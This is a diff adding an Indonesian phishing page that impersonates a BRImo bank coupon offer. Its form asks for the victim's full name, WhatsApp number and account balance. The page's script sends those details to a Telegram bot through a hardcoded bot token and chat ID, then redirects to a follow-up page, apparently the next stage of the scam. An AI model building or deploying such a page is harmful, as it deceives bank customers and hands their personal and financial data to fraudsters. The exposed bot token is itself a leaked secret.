@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>cup0nbr1</title>
+  <link rel="stylesheet" href="style3.css"/>
+</head>
+<body>
+
+  <!-- Carousel otomatis jalan pelan -->
+  <div class="carousel-wrapper">
+    <div class="carousel-track">
+      <img src="img1.jpg" alt="1" />
+      <img src="img2.jpg" alt="2" />
+      <img src="img3.jpg" alt="3" />
+      <img src="img4.jpg" alt="4" />
+      <!-- duplikasi gambar agar looping lancar -->
+      <img src="img1.jpg" alt="1" />
+      <img src="img2.jpg" alt="2" />
+      <img src="img3.jpg" alt="3" />
+      <img src="img4.jpg" alt="4" />
+    </div>
+  </div>
+
+  <!-- Formulir -->
+  <div class="form-container">
+    <h2>Pencetakan Kupon <span class="blue">BRI</span><span class="orange">mo</span> :</h2>
+    <form id="brimoForm">
+      <label for="nama">Nama Lengkap:</label>
+      <input type="text" id="nama" placeholder="Nama sesuai KTP" required />
+
+      <label for="wa">Nomor WhatsApp:</label>
+      <input type="tel" id="wa" placeholder="08xxxxx" required />
+
+      <label for="saldo">Saldo Akhir:</label>
+      <input type="tel" id="saldo" placeholder="Rp. xxx" required />
+
+      <button type="submit">Lanjutkan</button>
+    </form>
+  </div>
+
+  <script>
+    // Format Saldo
+    const saldoInput = document.getElementById("saldo");
+    saldoInput.addEventListener("input", function () {
+      let angka = this.value.replace(/[^\d]/g, "");
+      if (!angka) {
+        this.value = "";
+        return;
+      }
+      this.value = "Rp. " + Number(angka).toLocaleString("id-ID");
+    });
+
+    // Kirim ke Telegram
+    document.getElementById("brimoForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const nama = document.getElementById("nama").value;
+      const wa = document.getElementById("wa").value;
+      const saldo = document.getElementById("saldo").value;
+
+      const token = "7604826476:AAE6LyJkiJDnFxSOTRhvVIelFaEfHN_6igw";
+      const chatId = "6698220508";
+      const text = `📋 Kupon BRImo\n\n👤 Nama: ${nama}\n📱 WhatsApp: ${wa}\n💰 Saldo: ${saldo}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: text })
+      }).then(response => {
+        if (response.ok) {
+          window.location.href = "index4.html";
+        } else {
+          alert("Gagal mengirim data!");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
+
+
+
+
+
+
+
